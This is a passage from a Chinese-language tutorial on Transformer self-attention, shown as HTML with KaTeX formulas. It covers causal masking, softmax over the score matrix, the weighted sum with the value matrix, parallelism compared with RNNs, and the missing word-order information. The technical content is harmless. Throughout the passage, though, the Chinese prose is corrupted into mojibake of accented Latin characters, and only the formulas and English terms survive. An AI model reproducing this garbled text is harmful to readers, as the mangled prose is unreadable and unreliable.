<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>P</mi><mrow><mi>m</mi><mi>a</mi><mi>s</mi><mi>k</mi><mi>e</mi><mi>d</mi></mrow></msub><mo stretchy="false">[</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>P</mi><mo stretchy="false">[</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>j</mi><mo>â‰¤</mo><mi>i</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>âˆ’</mo><mi mathvariant="normal">âˆ</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>j</mi><mo>&gt;</mo><mi>i</mi></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">P_{masked}[i,j] = \left\{\begin{matrix}

 P[i,j] &amp; j\le i\\
 -\infty  &amp; j&gt; i
\end{matrix}\right.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ma</span><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">âˆ’</span><span class="mord">âˆ</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal">i</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>éšåï¼Œæˆ‘ä»¬å¯¹çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span>ï¼ˆæˆ– <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>m</mi><mi>a</mi><mi>s</mi><mi>k</mi><mi>e</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">P_{masked}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ma</span><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ï¼‰çš„<strong>æ¯ä¸€è¡Œ</strong>åº”ç”¨ softmax å‡½æ•°è¿›è¡Œå½’ä¸€åŒ–ï¼Œç¡®ä¿æ¯ä¸€è¡Œçš„æ‰€æœ‰æƒé‡ä¹‹å’Œä¸º 1ï¼Œä»è€Œå¾—åˆ°æœ€ç»ˆçš„æ³¨æ„åŠ›æƒé‡çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></span>ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>S</mi><mo>=</mo><mtext>softmax</mtext><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mtext>dim</mtext><mo>=</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>Â Â Â </mtext><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S = \text{softmax}(P,\text{dim}=1) \space \space \space (seq\_len,seq\_len)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">softmax</span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord text"><span class="mord">dim</span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mord">1</span><span class="mclose">)</span><span class="mspace">Â </span><span class="mspace">Â </span><span class="mspace">Â </span><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></div>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></span> çŸ©é˜µçš„æ¯ä¸€è¡Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">S[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span></span> éƒ½æ˜¯ä¸€ä¸ªæ¦‚ç‡åˆ†å¸ƒï¼Œå®ƒç²¾ç¡®åœ°åˆ»ç”»äº†åœ¨ç”Ÿæˆè¾“å‡º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> æ—¶ï¼Œæ¨¡å‹åº”è¯¥å°†å¤šå°‘â€œæ³¨æ„åŠ›â€åˆ†é…ç»™è¾“å…¥åºåˆ—ä¸­çš„æ¯ä¸€ä¸ªä½ç½® <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span>ã€‚</p>
<p>æœ€åï¼Œæˆ‘ä»¬å°†è¿™ä¸ªæ³¨æ„åŠ›æƒé‡çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></span> ä¸å€¼çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span> ç›¸ä¹˜ï¼Œå³å¯å¾—åˆ°è¾“å‡ºçŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span>ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>Y</mi><mo>=</mo><mi>S</mi><mo>â‹…</mo><mi>V</mi><mtext>Â Â Â </mtext><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Y = S \cdot V \space\space\space (seq\_len,out\_size)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace">Â </span><span class="mspace">Â </span><span class="mspace">Â </span><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span></span></div>
<p>è¿™ä¸€æ­¥çš„æœ¬è´¨æ˜¯åŠ æƒæ±‚å’Œã€‚<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span> çš„æ¯ä¸€è¡Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> éƒ½æ˜¯ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span> ä¸­æ‰€æœ‰è¡Œçš„åŠ æƒç»„åˆï¼Œæƒé‡ç”± <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">S[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span></span> å†³å®šã€‚å› æ­¤ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> ä¸å†æ˜¯å­¤ç«‹çš„ä¿¡æ¯ï¼Œè€Œæ˜¯èåˆäº†æ•´ä¸ªåºåˆ—ç›¸å…³ä¿¡æ¯çš„â€œè¯­å¢ƒåŒ–â€è¡¨ç¤ºã€‚</p>
<p>æˆ‘ä»¬å°†ä»¥ä¸Šçš„è®¡ç®—è¿‡ç¨‹ï¼Œå°±æ˜¯é€šè¿‡è¾“å…¥<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>ï¼Œæœ€åè®¡ç®—å¾—åˆ°<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span>çš„æµç¨‹ç”¨å¦‚ä¸‹å›¾è¡¨ç¤ºï¼šï¼ˆä¸‹å›¾ä¸­çš„<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi></mrow><annotation encoding="application/x-tex">Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></span>å°±æ˜¯æˆ‘ä»¬æ–‡ä¸­çš„è¾“å‡º<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span>ï¼Œåæ–‡ä¸­å‡ç”¨<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi></mrow><annotation encoding="application/x-tex">Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></span>è¡¨ç¤ºè¾“å‡ºï¼‰</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d932f9130cde49e5a5f3eb2e21812d98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=GXmi1S4t0DRtJB65lh%2FaIgaOwyY%3D" alt="c10.jpg" loading="lazy"/></p>
<p>ä»¥ä¸Šï¼Œå°±æ˜¯â€œè‡ªæ³¨æ„åŠ›â€çš„è®¡ç®—è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶å°è£…ä¸ºä¸€ä¸ªâ€œè‡ªæ³¨æ„åŠ›(Self Attention)â€æ¨¡å—ï¼Œå°±å¦‚åŒä¸Šå›¾æ‰€ç¤ºã€‚</p>
<p>è‡³æ­¤ï¼Œæˆ‘ä»¬ä»…ç”¨å‡ è¡Œæ¸…æ™°çš„çŸ©é˜µè¿ç®—ï¼Œå°±å®Œæˆäº†å°†è¾“å…¥åºåˆ— <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span> è½¬æ¢ä¸ºä¸Šä¸‹æ–‡æ„ŸçŸ¥çš„è¾“å‡ºåºåˆ— <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span> çš„å…¨éƒ¨è¿‡ç¨‹ã€‚éå¸¸çš„ä¼˜é›…ã€é«˜æ•ˆã€‚</p>
<p>å¦å¤–ï¼Œè¿™ç§æ–¹å¼ç›¸æ¯”ä¼ ç»Ÿçš„å¾ªç¯ç¥ç»ç½‘ç»œï¼ˆLSTMï¼ŒGRUç­‰ï¼‰ï¼Œæ•ˆç‡æå‡äº†è®¸å¤šï¼Œä¸ºä»€ä¹ˆï¼ŸRNNçš„æ ¸å¿ƒæ˜¯å…¶å¾ªç¯ç»“æ„ã€‚ä¸ºäº†å¤„ç†åºåˆ—ä¸­çš„ç¬¬ <code>t</code> ä¸ªå…ƒç´ ï¼Œå®ƒå¿…é¡»ç­‰å¾…ç¬¬ <code>t-1</code> ä¸ªå…ƒç´ çš„éšçŠ¶æ€è®¡ç®—å®Œæˆã€‚è¿™ç§ä¸¥æ ¼çš„<strong>æ—¶åºä¾èµ–å…³ç³»</strong>å°±åƒä¸€æ¡å•è¡Œç”Ÿäº§çº¿ï¼Œå·¥åºå¿…é¡»ä¸€ä¸ªæ¥ä¸€ä¸ªè¿›è¡Œã€‚åœ¨è®­ç»ƒæ—¶ï¼Œè¿™è¢«ç§°ä¸ºâ€œä¸²è¡Œä¾èµ–â€ï¼Œæ„å‘³ç€æ¨¡å‹æ— æ³•åŒæ—¶å¤„ç†ä¸€ä¸ªæ‰¹æ¬¡ä¸­æ‰€æœ‰åºåˆ—ä½ç½®çš„è®¡ç®—ã€‚è¿™å°±æ„å‘³ç€å³ä½¿æ‹¥æœ‰å¼ºå¤§çš„GPUï¼Œè®¡ç®—ä¹Ÿå¿…é¡»æŒ‰æ—¶é—´æ­¥å±•å¼€ï¼Œæ— æ³•å……åˆ†åˆ©ç”¨GPUæˆåƒä¸Šä¸‡ä¸ªæ ¸å¿ƒçš„å¹¶è¡Œèƒ½åŠ›ã€‚</p>
<p>è€ŒTransformeré€šè¿‡æ³¨æ„åŠ›æœºåˆ¶ï¼Œ<strong>å°†åºåˆ—ä¸­æ‰€æœ‰å…ƒç´ ä¹‹é—´çš„å…³è”è®¡ç®—ï¼Œä¸€æ¬¡æ€§è¡¨è¿°ä¸ºçŸ©é˜µä¹˜æ³•</strong>ã€‚å¯¹äºGPUæ¥è¯´ï¼Œè¿™æ˜¯å®ƒæœ€æ“…é•¿å¤„ç†çš„<strong>ç¨ å¯†çŸ©é˜µè¿ç®—</strong>ï¼Œå¯ä»¥è°ƒç”¨æµ·é‡è®¡ç®—æ ¸å¿ƒåŒæ—¶å®Œæˆæ•°ä»¥ç™¾ä¸‡è®¡çš„ç‚¹ç§¯è¿ç®—ã€‚è€Œè®¡ç®—ä½ç½® <code>i</code> ä¸ä½ç½® <code>j</code> çš„æ³¨æ„åŠ›æƒé‡ï¼Œ<strong>ä¸å†ä¾èµ–äº</strong>ä½ç½® <code>i-1</code> æˆ– <code>j-1</code> çš„ä»»ä½•ä¸­é—´ç»“æœã€‚è¿™ç§è®¾è®¡å½»åº•æ‰“ç ´äº†æ—¶åºæ·é”ã€‚</p>
<hr/>
<p>ç›¸ä¿¡è®¤çœŸè¯»åˆ°è¿™é‡Œçš„ä½ ï¼Œå¿ƒä¸­å¯èƒ½ä¼šæµ®ç°ä¸€ä¸ªé‡è¦çš„ç–‘é—®ï¼š<strong>åºåˆ—æ•°æ®ä¸­è‡³å…³é‡è¦çš„æ—¶åºä¿¡æ¯å»å“ªå„¿äº†ï¼Ÿ</strong> Transformerçš„â€œè‡ªæ³¨æ„åŠ›â€æœºåˆ¶ä¼¼ä¹åªä¸“æ³¨äºè®¡ç®—è¯ä¸è¯ä¹‹é—´çš„å…³è”å¼ºåº¦ï¼Œå´<strong>å®Œå…¨å¿½ç•¥äº†å®ƒä»¬åœ¨åºåˆ—ä¸­çš„ç›¸å¯¹ä½ç½®æˆ–ç»å¯¹è·ç¦»</strong>ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œè€ƒè™‘ä»¥ä¸‹ä¸¤ä¸ªå¥å­ï¼š</p>
<ul>
<li>â€œ<strong>æˆ‘</strong>çˆ±<strong>ä½ </strong>â€</li>
<li>â€œ<strong>ä½ </strong>çˆ±<strong>æˆ‘</strong>â€</li>
</ul>
<p>è¿™ä¸¤ä¸ªå¥å­åŒ…å«å®Œå…¨ç›¸åŒçš„è¯è¯­ã€‚å¦‚æœåªä¾èµ–è‡ªæ³¨æ„åŠ›æœºåˆ¶ï¼Œæ¨¡å‹ä¸ºâ€œçˆ±â€è¿™ä¸ªè¯è®¡ç®—å‡ºçš„ä¸Šä¸‹æ–‡è¡¨ç¤ºï¼Œåœ¨ä¸¤ä¸ªå¥å­ä¸­å¯èƒ½ä¼šéå¸¸ç›¸ä¼¼ï¼Œå› ä¸ºå®ƒåœ¨ä¸¤ä¸ªå¥å­é‡Œéƒ½ä¸â€œæˆ‘â€å’Œâ€œä½ â€å‘ç”Ÿäº†å…³è”ã€‚ç„¶è€Œï¼Œä»»ä½•ä¸€ä¸ªæ‡‚ä¸­æ–‡çš„äººéƒ½çŸ¥é“ï¼Œ<strong>è¯è¯­çš„é¡ºåºå½»åº•æ”¹å˜äº†å¥å­çš„å«ä¹‰</strong>ã€‚è‡ªæ³¨æ„åŠ›æœºåˆ¶åœ¨è®¡ç®—æ—¶ï¼Œå¹¶æ²¡æœ‰å†…ç½®ä»»ä½•å…³äºâ€œæˆ‘â€åœ¨â€œä½ â€ä¹‹å‰è¿˜æ˜¯ä¹‹åçš„æ¦‚å¿µï¼Œå®ƒä¸¢å¤±äº†è¯­è¨€ä¸­è¿™ç§æ ¹æœ¬æ€§çš„<strong>æ—¶åºç»“æ„</strong>ã€‚</p>
<p>**è¿™æ˜¯ä¸€ä¸ªéå¸¸å…³é”®çš„æ´å¯Ÿï¼**è¿™æ˜¯åŸå§‹è‡ªæ³¨æ„åŠ›æœºåˆ¶çš„ä¸€ä¸ªæ ¸å¿ƒå±€é™ï¼šå®ƒæœ¬è´¨ä¸Šæ˜¯ä¸€ç§ç½®æ¢ä¸å˜æ“ä½œã€‚æ— è®ºè¾“å…¥çš„è¯åºå¦‚ä½•æ‰“ä¹±ï¼Œåªè¦è¯å‘é‡é›†åˆä¸å˜ï¼Œè‡ªæ³¨æ„åŠ›è®¡ç®—å‡ºçš„è¾“å‡ºé›†åˆåœ¨ç†è®ºä¸Šå°±æ˜¯ä¸å˜çš„ã€‚è¿™å¯¹äºç†è§£è¯­è¨€ã€ä»£ç ã€éŸ³ä¹ç­‰ä»»ä½•ä¾èµ–é¡ºåºçš„ç»“æ„æ¥è¯´æ˜¯è‡´å‘½çš„ç¼ºé™·ã€‚</p>
